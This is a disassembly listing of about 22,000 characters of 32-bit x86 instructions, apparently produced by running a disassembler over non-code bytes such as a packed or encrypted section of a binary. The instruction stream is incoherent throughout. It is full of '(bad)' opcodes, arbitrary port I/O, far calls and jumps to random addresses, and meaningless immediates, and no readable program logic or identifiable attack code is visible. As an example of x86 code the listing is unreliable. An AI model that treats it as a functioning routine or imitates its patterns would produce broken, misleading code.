  41aac3:	mov    ecx,0x68512631
  41aac8:	pop    ss
  41aac9:	mov    esp,0x1d535aef
  41aace:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aacf:	cmp    al,0x9c
  41aad1:	xor    BYTE PTR [ebp-0x786f73a9],al
  41aad7:	sub    eax,0xc369376
  41aadc:	ds inc ecx
  41aade:	out    dx,al
  41aadf:	sbb    edx,DWORD PTR [ecx+ebp*4]
  41aae2:	daa    
  41aae3:	mov    WORD PTR [esi-0x1ff7a8a4],?
  41aae9:	push   eax
  41aaea:	jns    0x41ab22
  41aaec:	sub    eax,0xf9394b4c
  41aaf1:	or     DWORD PTR [ebx-0x60],edx
  41aaf4:	or     eax,0x9020ed1b
  41aaf9:	(bad)  
  41aafa:	out    dx,al
  41aafb:	and    dh,BYTE PTR ds:0x39dc0048
  41ab01:	xor    eax,0xb57458c8
  41ab06:	(bad)  
  41ab07:	loop   0x41aad4
  41ab09:	out    0x35,al
  41ab0b:	sub    ah,BYTE PTR [ebx+0xb61c69a]
  41ab11:	add    eax,0x6636ce34
  41ab16:	cmp    al,BYTE PTR [esi-0x33]
  41ab19:	call   0xe6d97081
  41ab1e:	test   BYTE PTR [edx],ch
  41ab20:	add    eax,0x3217c241
  41ab25:	clc    
  41ab26:	hlt    
  41ab27:	rol    BYTE PTR [ecx+ebp*8+0x3e4ff62c],0x41
  41ab2f:	pop    ecx
  41ab30:	pop    es
  41ab31:	sbb    BYTE PTR [ebp+0x70],0x49
  41ab35:	xlat   BYTE PTR ds:[ebx]
  41ab36:	mov    bh,0x7a
  41ab38:	out    dx,al
  41ab39:	push   DWORD PTR [ebx+edi*1+0x4ffe465b]
  41ab40:	and    bh,BYTE PTR [ebp-0x76389055]
  41ab46:	fld    st(4)
  41ab48:	popf   
  41ab49:	jae    0x41ab0b
  41ab4b:	and    ah,BYTE PTR [eax]
  41ab4d:	jae    0x41aacf
  41ab4f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ab50:	(bad)  
  41ab52:	in     al,dx
  41ab53:	shr    ah,0xb0
  41ab56:	ins    DWORD PTR es:[edi],dx
  41ab57:	pop    ds
  41ab58:	imul   edx,DWORD PTR [eax],0x47
  41ab5b:	adc    ebp,0x30
  41ab5e:	(bad)  
  41ab5f:	ins    DWORD PTR es:[edi],dx
  41ab60:	inc    ebp
  41ab61:	rcr    BYTE PTR [eax+0x5d853622],1
  41ab67:	and    BYTE PTR [ecx],dl
  41ab69:	fistp  DWORD PTR [edx]
  41ab6b:	fnstsw WORD PTR [esi+ebx*4+0xf190f59]
  41ab72:	mov    BYTE PTR [esi-0x4d1bae14],bh
  41ab78:	push   edx
  41ab79:	sbb    al,BYTE PTR [edi]
  41ab7b:	push   eax
  41ab7c:	adc    al,0xbe
  41ab7e:	xchg   ecx,eax
  41ab7f:	mov    ah,0xb
  41ab81:	inc    ebp
  41ab82:	pusha  
  41ab83:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ab84:	int    0x27
  41ab86:	jno    0x41ab3c
  41ab88:	mov    ebp,0xf5a195e9
  41ab8d:	shr    edx,cl
  41ab8f:	dec    eax
  41ab90:	add    ecx,DWORD PTR [edx-0x39]
  41ab93:	in     eax,dx
  41ab94:	adc    al,0x52
  41ab96:	(bad)  
  41ab98:	pushf  
  41ab99:	and    ebx,0x6d503674
  41ab9f:	xor    DWORD PTR [ecx],ebp
  41aba1:	and    al,0x56
  41aba3:	jg     0x41abb4
  41aba5:	dec    esi
  41aba6:	xor    dl,ah
  41aba8:	and    dh,dl
  41abaa:	jnp    0x41abec
  41abac:	popa   
  41abad:	call   DWORD PTR [esi]
  41abaf:	xchg   ebx,eax
  41abb0:	scas   al,BYTE PTR es:[edi]
  41abb1:	xor    dl,dh
  41abb3:	push   edx
  41abb4:	xchg   ebx,eax
  41abb5:	(bad)
  41abb9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41abba:	cmp    eax,0x923f1829
  41abbf:	icebp  
  41abc0:	add    esi,ecx
  41abc2:	cmc    
  41abc3:	aam    0x0
  41abc5:	mov    edi,0x59489496
  41abca:	inc    eax
  41abcb:	and    DWORD PTR [ebp-0x72],ebx
  41abce:	test   eax,0x120b01aa
  41abd3:	cmp    dh,bl
  41abd5:	and    DWORD PTR [ecx+0x5271e14e],edi
  41abdb:	test   al,0x3d
  41abdd:	push   ds
  41abde:	out    dx,al
  41abdf:	or     al,0xc0
  41abe1:	add    ecx,DWORD PTR [edx+ebp*2-0x44]
  41abe5:	cmp    al,0xee
  41abe7:	sub    eax,0x285a093a
  41abec:	inc    ebp
  41abed:	xbegin 0x90723d40
  41abf3:	sbb    edi,DWORD PTR [eax]
  41abf5:	push   ebp
  41abf6:	outs   dx,BYTE PTR ds:[esi]
  41abf7:	ret    
  41abf8:	mov    ch,0x1
  41abfa:	xor    al,0x98
  41abfc:	icebp  
  41abfd:	xor    cl,BYTE PTR [ebp+0x48]
  41ac00:	sub    dh,BYTE PTR [edi-0x7b8a901b]
  41ac06:	sahf   
  41ac07:	pop    ss
  41ac08:	(bad)  
  41ac09:	les    esp,FWORD PTR [ebp-0x28]
  41ac0c:	pop    esp
  41ac0d:	mov    ch,0xc
  41ac0f:	fs ins BYTE PTR es:[edi],dx
  41ac11:	mov    DWORD PTR [esi-0x34],ebx
  41ac14:	push   0xffffff85
  41ac16:	out    dx,eax
  41ac17:	cmc    
  41ac18:	mov    ch,0x39
  41ac1a:	inc    esp
  41ac1b:	into   
  41ac1c:	daa    
  41ac1d:	ss out dx,eax
  41ac1f:	push   ds
  41ac20:	pop    ecx
  41ac21:	hlt    
  41ac22:	aaa    
  41ac23:	adc    edi,edx
  41ac25:	popf   
  41ac26:	jno    0x41ac2a
  41ac28:	pop    ecx
  41ac29:	dec    ebx
  41ac2a:	mov    al,0xe3
  41ac2c:	lahf   
  41ac2d:	test   al,0x60
  41ac2f:	je     0x41ac61
  41ac31:	call   0xa162:0x6133b583
  41ac38:	sbb    bh,BYTE PTR [edi+0x1c]
  41ac3b:	loope  0x41ac9c
  41ac3d:	fxsave [ecx-0x4d856107]
  41ac44:	mov    esi,0xaa7897cc
  41ac49:	mov    ebp,0x784a52b5
  41ac4e:	call   0xe7ba:0xee472740
  41ac55:	and    DWORD PTR [ecx+0x1c],eax
  41ac58:	loope  0x41ac58
  41ac5a:	mov    bh,0xf9
  41ac5c:	add    eax,DWORD PTR [esi]
  41ac5e:	leave  
  41ac5f:	pop    edi
  41ac60:	or     edx,DWORD PTR [ecx]
  41ac62:	and    BYTE PTR [ebx+0x60],al
  41ac65:	sbb    eax,0x529cce16
  41ac6a:	imul   esp,DWORD PTR [ebp+0x3abf0ccf],0xa
  41ac71:	or     BYTE PTR [eax+0x677383ad],0x2f
  41ac78:	leave  
  41ac79:	mov    ?,WORD PTR [edi-0x6f]
  41ac7c:	hlt    
  41ac7d:	ror    eax,cl
  41ac7f:	pop    esi
  41ac80:	stos   BYTE PTR es:[edi],al
  41ac81:	loope  0x41ac70
  41ac83:	ret    
  41ac84:	push   edi
  41ac85:	or     dl,cl
  41ac87:	cmp    ah,BYTE PTR [ebp+ebx*2+0x63ad35ef]
  41ac8e:	sahf   
  41ac8f:	cmp    DWORD PTR [edx+ebp*1-0x11],ecx
  41ac93:	mov    ebx,gs
  41ac95:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ac96:	into   
  41ac97:	inc    ebx
  41ac98:	jne    0x41ac74
  41ac9a:	aam    0x13
  41ac9c:	sub    esi,DWORD PTR [ebp-0x2dc6b1]
  41aca2:	dec    edx
  41aca3:	dec    esi
  41aca4:	add    eax,0x2eb6945
  41aca9:	imul   eax,edi,0xf61b719d
  41acaf:	and    eax,0x3c9b5c3a
  41acb4:	ja     0x41ac50
  41acb6:	adc    bh,bh
  41acb8:	and    ch,bl
  41acba:	mov    bh,0x4a
  41acbc:	jmp    0x557100b2
  41acc1:	out    dx,al
  41acc2:	inc    esp
  41acc3:	jbe    0x41ac96
  41acc5:	mov    edi,0x16441de6
  41acca:	inc    edx
  41accb:	mov    DWORD PTR [esi+0x71],esi
  41acce:	pop    edi
  41accf:	sbb    esp,DWORD PTR [eax]
  41acd1:	js     0x41ac91
  41acd3:	cmp    DWORD PTR [ebp+ecx*2-0x72],edi
  41acd7:	mov    ah,BYTE PTR [esi]
  41acd9:	jno    0x41ad04
  41acdb:	test   DWORD PTR [ecx+0x38],edi
  41acde:	pop    ebp
  41acdf:	mov    eax,gs
  41ace1:	cs push ss
  41ace3:	imul   edx,DWORD PTR [esi+0x23],0x4b
  41ace7:	scas   eax,DWORD PTR es:[edi]
  41ace8:	test   al,0xd7
  41acea:	aas    
  41aceb:	mov    ch,0xdb
  41aced:	push   eax
  41acee:	enter  0xcde8,0xaa
  41acf2:	out    0x0,eax
  41acf4:	mov    esp,esp
  41acf6:	add    esi,ecx
  41acf8:	int3   
  41acf9:	outs   dx,DWORD PTR ds:[esi]
  41acfa:	bound  edi,QWORD PTR [edx-0x1f]
  41acfd:	shr    DWORD PTR [edx],1
  41acff:	jp     0x41ad01
  41ad01:	inc    eax
  41ad02:	outs   dx,DWORD PTR ds:[esi]
  41ad03:	aad    0x46
  41ad05:	aad    0x51
  41ad07:	sbb    BYTE PTR [ebx-0x4f55c8fb],0x4f
  41ad0e:	adc    al,0x12
  41ad10:	adc    ah,BYTE PTR [eax+0x68d5e31a]
  41ad16:	xchg   DWORD PTR [esi+0x407039e],edi
  41ad1c:	pop    ecx
  41ad1d:	and    eax,0x315f84ab
  41ad22:	addr16 jp 0x41acaa
  41ad25:	enter  0x4873,0xf8
  41ad29:	dec    ebp
  41ad2a:	dec    ebp
  41ad2b:	shr    DWORD PTR [ecx],cl
  41ad2d:	mov    dh,0x55
  41ad2f:	in     al,0x73
  41ad31:	adc    ecx,DWORD PTR [edx+0x680b369]
  41ad37:	idiv   edi
  41ad39:	mov    ebp,0xaac6dc00
  41ad3e:	dec    ecx
  41ad3f:	lea    ebp,[edx]
  41ad41:	mov    ch,BYTE PTR [ecx+0x1f]
  41ad44:	ins    BYTE PTR es:[edi],dx
  41ad45:	adc    al,0x1
  41ad47:	retf   
  41ad48:	jle    0x41ad8d
  41ad4a:	jno    0x41ad49
  41ad4c:	push   es
  41ad4d:	retf   0x2dad
  41ad50:	push   ds
  41ad51:	cmp    edi,esi
  41ad53:	ret    0x4633
  41ad56:	mul    BYTE PTR [ebx-0x71]
  41ad59:	outs   dx,DWORD PTR ds:[esi]
  41ad5a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ad5b:	in     al,dx
  41ad5c:	enter  0x9d00,0x26
  41ad60:	repz jb 0x41adbe
  41ad63:	mov    ds:0x2e3dbb89,al
  41ad68:	icebp  
  41ad69:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ad6a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ad6b:	cmp    eax,DWORD PTR [edx-0x1e]
  41ad6e:	sub    BYTE PTR [ecx+0x79],dh
  41ad71:	and    al,0x8a
  41ad73:	call   0xeac60f6a
  41ad78:	mov    ds:0x7d1d62f2,eax
  41ad7d:	out    dx,eax
  41ad7e:	pop    ds
  41ad7f:	mov    al,ds:0xb5aeaabd
  41ad84:	retf   
  41ad85:	push   es
  41ad86:	cmp    BYTE PTR [edi],0x4b
  41ad89:	and    BYTE PTR [edi],bl
  41ad8b:	shl    BYTE PTR [ebx-0x5e],1
  41ad8e:	add    eax,0xc65ba4ed
  41ad93:	aas    
  41ad94:	out    dx,al
  41ad95:	push   eax
  41ad96:	xchg   edx,eax
  41ad97:	jbe    0x41ad27
  41ad99:	std    
  41ad9a:	mov    WORD PTR ds:0xf4503130,es
  41ada0:	inc    esi
  41ada1:	mov    ch,0x74
  41ada3:	es sub al,0x27
  41ada6:	add    BYTE PTR [eax-0x1df7eded],dh
  41adac:	fcomp  DWORD PTR ds:0xdb608901
  41adb2:	gs pop ecx
  41adb4:	add    bl,BYTE PTR [ecx-0x25d36627]
  41adba:	ds je  0x41ada2
  41adbd:	(bad)  
  41adbe:	js     0x41ae0b
  41adc0:	jmp    0x829185ea
  41adc5:	outs   dx,BYTE PTR ds:[esi]
  41adc7:	fdivr  DWORD PTR [eax]
  41adc9:	je     0x41add8
  41adcb:	es loope 0x41ae30
  41adce:	sub    ebp,edx
  41add0:	js     0x41adaa
  41add2:	and    BYTE PTR [ebx-0x65213a43],bh
  41add8:	out    dx,al
  41add9:	add    al,0x73
  41addb:	adc    eax,0x4054ae6e
  41ade0:	les    esi,FWORD PTR [eax+0x16]
  41ade3:	mov    eax,DWORD PTR [ebx-0x2f6c967b]
  41ade9:	es mov bh,0x47
  41adec:	jmp    0x692bcb88
  41adf1:	test   BYTE PTR [ecx-0x6c7efc0e],al
  41adf7:	mov    dh,al
  41adf9:	xchg   edx,eax
  41adfa:	gs push esp
  41adfc:	or     ch,BYTE PTR [ebx]
  41adfe:	push   ss
  41adff:	in     eax,0x8a
  41ae01:	int    0xbd
  41ae03:	push   ecx
  41ae04:	ins    BYTE PTR es:[edi],dx
  41ae05:	out    0x1b,al
  41ae07:	into   
  41ae08:	(bad)  
  41ae09:	jnp    0x41ae6c
  41ae0b:	retf   0xab46
  41ae0e:	and    edi,DWORD PTR [ebx-0x7d]
  41ae11:	mov    esi,0x55e80caf
  41ae16:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ae17:	ret    0xc5a6
  41ae1a:	cmp    eax,esi
  41ae1c:	mov    eax,0x7d07c65b
  41ae21:	stos   BYTE PTR es:[edi],al
  41ae22:	out    dx,al
  41ae23:	outs   dx,BYTE PTR ds:[esi]
  41ae24:	lods   al,BYTE PTR ds:[esi]
  41ae25:	sbb    DWORD PTR [ecx],ebx
  41ae27:	pop    ss
  41ae28:	lods   al,BYTE PTR ds:[esi]
  41ae29:	leave  
  41ae2a:	sbb    BYTE PTR [ecx-0x597214d2],cl
  41ae30:	mov    bh,0x82
  41ae32:	aam    0xb0
  41ae34:	imul   ebp,DWORD PTR [ebp+0xe87b987],0xffffffd1
  41ae3b:	mov    ?,edi
  41ae3d:	sbb    ebx,edx
  41ae3f:	not    BYTE PTR [edi]
  41ae41:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ae42:	adc    DWORD PTR [edx],ebx
  41ae44:	fninit 
  41ae46:	mov    eax,0x41984180
  41ae4b:	add    esp,DWORD PTR [eax]
  41ae4d:	adc    BYTE PTR [esi-0x4b07420e],dh
  41ae53:	jmp    0x41ae65
  41ae55:	ror    BYTE PTR [ebp+0x50f4102],0x8b
  41ae5c:	pop    ds
  41ae5d:	pop    esi
  41ae5e:	sbb    BYTE PTR es:[ecx],bl
  41ae61:	pop    esi
  41ae62:	jno    0x41ae32
  41ae64:	cdq    
  41ae65:	shl    BYTE PTR [edx-0x1229738a],1
  41ae6b:	in     al,dx
  41ae6c:	int    0xdd
  41ae6e:	test   eax,0x240028a0
  41ae73:	mov    eax,ds:0x65e94130
  41ae78:	pop    ebx
  41ae79:	out    dx,al
  41ae7a:	xor    eax,0xe4ab1516
  41ae7f:	idiv   BYTE PTR [esi-0x58]
  41ae82:	mov    cl,0x8c
  41ae84:	inc    esp
  41ae85:	in     eax,0x8e
  41ae87:	mov    esi,0xba0eb1d7
  41ae8c:	mov    cl,BYTE PTR [ecx-0x35]
  41ae8f:	lods   al,BYTE PTR ds:[esi]
  41ae90:	jb     0x41ae94
  41ae92:	mov    dh,0xc6
  41ae94:	mov    ebp,0x7f26a9ce
  41ae99:	pop    esp
  41ae9a:	rcr    DWORD PTR [edi-0x3f365484],0xf0
  41aea1:	outs   dx,BYTE PTR ds:[esi]
  41aea2:	pop    ecx
  41aea3:	jmp    0x41ae3a
  41aea5:	sub    DWORD PTR [ebp+0x12],esi
  41aea8:	aas    
  41aea9:	les    ecx,FWORD PTR [ecx-0x42c30d3]
  41aeaf:	call   0xc31a1e01
  41aeb4:	or     edi,DWORD PTR [ecx+0x4c]
  41aeb7:	stc    
  41aeb8:	imul   ebx,DWORD PTR [edi],0x4
  41aebb:	xchg   ebp,eax
  41aebc:	jmp    0xfcaa:0xfc2a435a
  41aec3:	cmp    ebp,eax
  41aec5:	leave  
  41aec6:	aaa    
  41aec7:	pop    ss
  41aec8:	fdiv   st,st(7)
  41aeca:	ficom  WORD PTR [ecx]
  41aecc:	add    esp,DWORD PTR [edx+0x8]
  41aecf:	nop
  41aed0:	in     al,dx
  41aed1:	mov    ds:0x91e41c6d,al
  41aed6:	mov    ch,0x36
  41aed8:	scas   eax,DWORD PTR es:[edi]
  41aed9:	cdq    
  41aeda:	inc    esi
  41aedb:	mov    ah,0x7c
  41aedd:	imul   edi,DWORD PTR [ecx],0x39
  41aee0:	clc    
  41aee1:	clc    
  41aee2:	sub    ebp,edx
  41aee4:	call   FWORD PTR [edi+0x7]
  41aee7:	stos   BYTE PTR es:[edi],al
  41aee8:	dec    esp
  41aee9:	les    eax,FWORD PTR [ebx-0x5ed7e7f4]
  41aeef:	cld    
  41aef0:	adc    al,0x89
  41aef2:	inc    esi
  41aef3:	jo     0x41aeaf
  41aef5:	sub    eax,edx
  41aef7:	aad    0xa5
  41aef9:	push   ebx
  41aefa:	mov    ecx,0x32e1a9b7
  41aeff:	mov    BYTE PTR [ebx*8+0x55007dfc],dl
  41af06:	pop    ss
  41af07:	sahf   
  41af08:	xchg   ebp,eax
  41af09:	fimul  WORD PTR [esi-0x5c0e40ef]
  41af0f:	(bad)  
  41af10:	aad    0x3b
  41af12:	test   eax,0x8c54ac16
  41af17:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41af18:	inc    eax
  41af19:	loopne 0x41af7e
  41af1b:	daa    
  41af1c:	adc    cl,BYTE PTR [esi-0x4d]
  41af1f:	mov    bl,0x86
  41af21:	ds test eax,0xf5b065d
  41af27:	adc    eax,DWORD PTR [edx]
  41af29:	pop    ebp
  41af2a:	fnstsw WORD PTR [ebx+0x1f]
  41af2d:	mov    eax,DWORD PTR [edx-0xd3fd871]
  41af33:	xchg   edi,eax
  41af34:	mov    esi,0xf279796d
  41af39:	add    eax,0xe06963a6
  41af3e:	mov    ds:0x967d0f1b,eax
  41af43:	(bad)  
  41af44:	cmp    al,0x22
  41af46:	add    dh,BYTE PTR [eax+0xe]
  41af49:	sar    DWORD PTR [edi-0x27],cl
  41af4c:	iret   
  41af4d:	mov    ?,eax
  41af4f:	mov    al,ds:0x1585836b
  41af54:	sbb    ebp,DWORD PTR [edx+0x5e971346]
  41af5a:	in     eax,dx
  41af5b:	adc    BYTE PTR [edx-0x3f25e8f5],0xdb
  41af62:	repz mov bh,0x12
  41af65:	clc    
  41af66:	dec    ebx
  41af67:	mov    edx,0x78089399
  41af6c:	mov    ds:0x8b563815,eax
  41af71:	hlt    
  41af72:	stc    
  41af73:	pop    edx
  41af74:	adc    bh,BYTE PTR [ebx+0x7f]
  41af77:	rol    DWORD PTR [edx-0x7fc39a4a],0xcb
  41af7e:	mov    ebx,0xdba25334
  41af83:	or     ebx,DWORD PTR [edi+ebx*8-0x1cd18cc3]
  41af8a:	sbb    dh,BYTE PTR [edi+0x8c489fe]
  41af90:	fwait
  41af91:	into   
  41af92:	push   ebp
  41af93:	pop    ebx
  41af94:	adc    ebp,eax
  41af96:	mov    dh,0x5e
  41af98:	xchg   esp,eax
  41af99:	mov    ecx,0x122e2b06
  41af9e:	lea    edi,[esi-0x116315dc]
  41afa4:	xor    BYTE PTR [edi],bh
  41afa6:	(bad)
  41afaa:	push   ebp
  41afab:	jmp    0x88ced63b
  41afb0:	scas   eax,DWORD PTR es:[edi]
  41afb1:	add    edi,ebp
  41afb3:	(bad)  [ebp+0x39015ff2]
  41afb9:	outs   dx,DWORD PTR ds:[esi]
  41afba:	push   ds
  41afbb:	xor    bl,BYTE PTR [ecx+0x15]
  41afbe:	rcl    DWORD PTR [ebp-0x5c],0x14
  41afc2:	outs   dx,BYTE PTR ds:[esi]
  41afc3:	xchg   edi,eax
  41afc4:	repnz xchg esp,eax
  41afc6:	fidiv  DWORD PTR [esi-0x1b8c047d]
  41afcc:	or     al,dl
  41afce:	xor    BYTE PTR [ecx+0x7c5e9f78],0x84
  41afd5:	add    eax,0x8e2ed839
  41afda:	add    edx,0x78
  41afdd:	cmp    eax,0x872e28c5
  41afe2:	ja     0x41af76
  41afe4:	pop    es
  41afe5:	add    eax,0x2d933b7d
  41afea:	mov    al,ds:0xd1efb875
  41afef:	aam    0x15
  41aff1:	arpl   WORD PTR [ebx],bp
  41aff3:	gs loopne 0x41afc2
  41aff6:	adc    edi,esp
  41aff8:	inc    esp
  41aff9:	aaa    
  41affa:	jmp    0xa430764b
  41afff:	sbb    al,0x5c
  41b001:	inc    esp
  41b002:	xor    DWORD PTR [ebx+0xbc7ff21],eax
  41b008:	xchg   DWORD PTR [esi-0x7a0328c0],ecx
  41b00e:	jno    0x41afe2
  41b010:	push   ebx
  41b011:	loopne 0x41afc3
  41b013:	dec    esi
  41b014:	sar    BYTE PTR [edi],0x2e
  41b017:	(bad)  
  41b019:	in     al,dx
  41b01a:	cmp    eax,0x75e0469
  41b01f:	rol    ebx,1
  41b021:	or     bh,BYTE PTR [edx]
  41b023:	lods   al,BYTE PTR ds:[esi]
  41b024:	cdq    
  41b025:	clc    
  41b026:	add    ebx,edi
  41b028:	jb     0x41afc7
  41b02a:	ins    BYTE PTR es:[edi],dx
  41b02b:	outs   dx,DWORD PTR ds:[esi]
  41b02c:	sbb    ecx,DWORD PTR [ebp+0x1c]
  41b02f:	push   ss
  41b030:	and    eax,0x6c66a17d
  41b035:	lock cmp eax,0xf816611e
  41b03b:	enter  0x5f8c,0xf9
  41b03f:	add    ebp,DWORD PTR [edx+0x7d]
  41b042:	fisubr WORD PTR ds:0x2183173c
  41b048:	inc    edi
  41b049:	in     eax,dx
  41b04a:	dec    esp
  41b04b:	sub    esp,DWORD PTR [esp+edi*8+0x47]
  41b04f:	jnp    0x41b09c
  41b051:	int3   
  41b052:	sti    
  41b053:	jb     0x41afd5
  41b055:	xor    eax,0x191d76d3
  41b05a:	jp     0x41b005
  41b05c:	cmp    BYTE PTR [ecx-0x29121f5c],ah
  41b062:	xchg   ecx,eax
  41b063:	jo     0x41b0a3
  41b065:	enter  0xd743,0xbc
  41b069:	retf   0x8fad
  41b06c:	jle    0x41b024
  41b06e:	cmp    eax,0x8bd13177
  41b073:	sub    eax,ebx
  41b075:	aad    0x4c
  41b077:	fwait
  41b078:	xor    eax,0x6b9df667
  41b07d:	xchg   edx,eax
  41b07e:	stos   BYTE PTR es:[edi],al
  41b07f:	cmp    al,0xa
  41b081:	sub    ch,ah
  41b083:	inc    ebp
  41b084:	dec    ebp
  41b085:	mul    DWORD PTR [ebx]
  41b087:	xchg   BYTE PTR [esi],dh
  41b089:	int3   
  41b08a:	xchg   edx,eax
  41b08b:	push   0x5b
  41b08d:	nop
  41b08e:	pop    ebp
  41b08f:	xor    BYTE PTR [esi+0x74],al
  41b092:	outs   dx,DWORD PTR ds:[esi]
  41b093:	cmp    ebp,ebx
  41b095:	arpl   WORD PTR [eax],dx
  41b097:	je     0x41b077
  41b099:	add    al,BYTE PTR [eax+ecx*8-0x1d7d86b1]
  41b0a0:	jne    0x41b02f
  41b0a2:	fistp  QWORD PTR [edx+eax*1+0x23cf6ac6]
  41b0a9:	push   ecx
  41b0aa:	xchg   ecx,eax
  41b0ab:	xchg   ebx,eax
  41b0ac:	sub    ecx,ebp
  41b0ae:	and    BYTE PTR [edx-0x27],dl
  41b0b1:	sub    BYTE PTR [ecx+ebx*2],ch
  41b0b4:	aam    0xdf
  41b0b6:	cmp    DWORD PTR [edi+0x8d14081],esi
  41b0bc:	out    0xc9,al
  41b0be:	ret    
  41b0bf:	inc    ecx
  41b0c0:	cld    
  41b0c1:	inc    ecx
  41b0c2:	icebp  
  41b0c3:	bound  ebx,QWORD PTR [edx]
  41b0c5:	xchg   esp,eax
  41b0c6:	jmp    0xe31d:0xd228204a
  41b0cd:	fistp  DWORD PTR [edx-0x3f]
  41b0d0:	push   ss
  41b0d1:	adc    al,0x8f
  41b0d3:	into   
  41b0d4:	sub    DWORD PTR [eax+ecx*2-0x19],0x1c
  41b0d9:	test   BYTE PTR [edi-0x4b8ac008],dl
  41b0df:	outs   dx,BYTE PTR ds:[esi]
  41b0e0:	stos   BYTE PTR es:[edi],al
  41b0e1:	jnp    0x41b06e
  41b0e3:	sub    BYTE PTR [ecx+0x41],ch
  41b0e6:	inc    esi
  41b0e7:	test   bh,bl
  41b0e9:	stc    
  41b0ea:	jecxz  0x41b06e
  41b0ec:	sub    eax,0x273ca9ef
  41b0f1:	jmp    0x3b740ac6
  41b0f6:	jl     0x41b138
  41b0f8:	lock ins DWORD PTR es:[edi],dx
  41b0fa:	pop    eax
  41b0fb:	push   edi
  41b0fc:	pop    ds
  41b0fd:	dec    edi
  41b0fe:	mov    dl,0x7e
  41b100:	cmp    al,0xf
  41b102:	push   edx
  41b103:	jp     0x41b12e
  41b105:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b106:	stos   DWORD PTR es:[edi],eax
  41b107:	xor    DWORD PTR [ebp+edi*1+0x67],edi
  41b10b:	pslld  mm6,QWORD PTR [ebx]
  41b10e:	push   0x7c
  41b110:	mov    esi,0x6de4cafb
  41b115:	mov    cl,0xae
  41b117:	bound  ecx,QWORD PTR ds:0x8f2752d4
  41b11d:	(bad)  
  41b11e:	cli    
  41b11f:	lods   al,BYTE PTR ds:[esi]
  41b120:	jbe    0x41b159
  41b122:	inc    ebx
  41b123:	jmp    0x1938:0xff4cc9c3
  41b12a:	shr    DWORD PTR [eax],cl
  41b12c:	pop    edi
  41b12d:	sti    
  41b12e:	pushf  
  41b12f:	in     eax,0x91
  41b131:	cld    
  41b132:	call   0xed855260
  41b137:	punpckhbw mm2,mm3
  41b13a:	test   eax,0xb241f7f5
  41b13f:	stos   BYTE PTR es:[edi],al
  41b140:	ror    DWORD PTR [ebx+0x4c],1
  41b143:	jl     0x41b12e
  41b145:	jmp    0x41b163
  41b147:	adc    DWORD PTR [eax+0x33],esp
  41b14a:	add    bh,BYTE PTR [eax]
  41b14c:	pop    ecx
  41b14d:	cwde   
  41b14e:	lahf   
  41b14f:	gs dec eax
  41b151:	aad    0xa4
  41b153:	(bad)  
  41b156:	ror    BYTE PTR ds:0x5b80c8aa,cl
  41b15c:	and    al,BYTE PTR [edi]
  41b15e:	and    ch,BYTE PTR [ecx-0x5a5d27ff]
  41b164:	cmp    DWORD PTR [esi+0x5f],ebp
  41b167:	mov    ch,0xdf
  41b169:	das    
  41b16a:	xlat   BYTE PTR ds:[ebx]
  41b16b:	out    0xb5,eax
  41b16d:	and    ebp,DWORD PTR [ecx]
  41b16f:	aaa    
  41b170:	mov    eax,0x89800177
  41b175:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b176:	rcr    edi,1
  41b178:	bnd jbe 0x41b15c
  41b17b:	hlt    
  41b17c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b17d:	outs   dx,DWORD PTR ds:[esi]
  41b17e:	(bad)  
  41b17f:	sbb    BYTE PTR cs:[ebx+0x75],0xd8
  41b184:	inc    eax
  41b185:	dec    esi
  41b186:	xchg   DWORD PTR [ecx+ebp*4-0x76da956a],edi
  41b18d:	mov    ch,0xe0
  41b18f:	dec    esp
  41b190:	add    dl,cl
  41b192:	loopne 0x41b18e
  41b194:	xor    bl,BYTE PTR [ebx+0x5debf98c]
  41b19a:	aas    
  41b19b:	shr    edx,0xe9
  41b19e:	mov    ah,0xcc
  41b1a0:	stc    
  41b1a1:	scas   al,BYTE PTR es:[edi]
  41b1a2:	arpl   WORD PTR [edi+eax*2],cx
  41b1a5:	mov    ah,al
  41b1a7:	push   esi
  41b1a8:	pop    ebx
  41b1a9:	inc    esi
  41b1aa:	mov    cs,WORD PTR [ebx+0x4bbaeb7e]
  41b1b0:	outs   dx,BYTE PTR ds:[esi]
  41b1b1:	fbstp  TBYTE PTR [edi-0x3a]
  41b1b4:	push   0x43
  41b1b6:	mov    ch,0xda
  41b1b8:	leave  
  41b1b9:	sahf   
  41b1ba:	pop    es
  41b1bb:	enter  0xb6df,0x79
  41b1bf:	pop    ebp
  41b1c0:	adc    BYTE PTR [ebx+ecx*2],0x95
  41b1c4:	gs jg  0x41b1cf
  41b1c7:	sub    bh,BYTE PTR [ecx+0x223eea36]
  41b1cd:	mov    eax,0x95bd643e
  41b1d2:	shr    DWORD PTR [ebp+0x24],1
  41b1d5:	add    eax,0x6e3212f7
  41b1da:	jge    0x41b208
  41b1dc:	sbb    al,0x63
  41b1df:	call   0x26e3:0x61dc8ef0
  41b1e6:	stos   BYTE PTR es:[edi],al
  41b1e7:	jne    0x41b1b9
  41b1e9:	jae    0x41b207
  41b1eb:	scas   eax,DWORD PTR es:[edi]
  41b1ec:	push   edi
  41b1ed:	mov    dl,0xd
  41b1ef:	sti    
  41b1f0:	mov    ebx,0xe4117802
  41b1f5:	inc    esp
  41b1f6:	push   cs
  41b1f7:	mov    esp,DWORD PTR [ebp-0x39]
  41b1fa:	addr16 in al,dx
  41b1fc:	pop    ebx
  41b1fd:	pop    ebp
  41b1fe:	test   al,0xb4
  41b200:	xchg   esi,eax
  41b201:	dec    esi
  41b202:	lods   eax,DWORD PTR ds:[esi]
  41b203:	inc    esp
  41b204:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b205:	rcl    BYTE PTR [edi+eax*4+0x1b],0x1
  41b20a:	add    al,0xff
  41b20c:	push   ebx
  41b20d:	lds    edi,FWORD PTR [ebx-0x64]
  41b210:	dec    ecx
